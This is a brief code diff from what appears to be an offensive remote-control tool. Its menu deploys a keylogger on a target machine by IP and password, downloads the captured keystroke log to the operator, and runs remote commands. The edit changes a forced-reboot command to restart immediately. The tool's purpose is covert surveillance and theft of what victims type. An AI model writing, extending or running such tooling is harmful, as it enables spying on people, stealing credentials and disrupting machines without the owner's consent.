@@ -156,8 +156,8 @@ def cli(arguments):
                     keylogger(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                 elif option == "2":
                     remote_download(tgt_ipv4,tgt_pword,f"{tgt_td}/{tgt_uname}.log",f"/home/{username}/Downloads/")
-                elif option == "4":
-                    remote_command(tgt_ipv4,tgt_pword,"shutdown /r")
+                elif option == "5":
+                    remote_command(tgt_ipv4,tgt_pword,"shutdown /r /t 0")
                 elif option == "help":
                     clear()
                     print(banner)
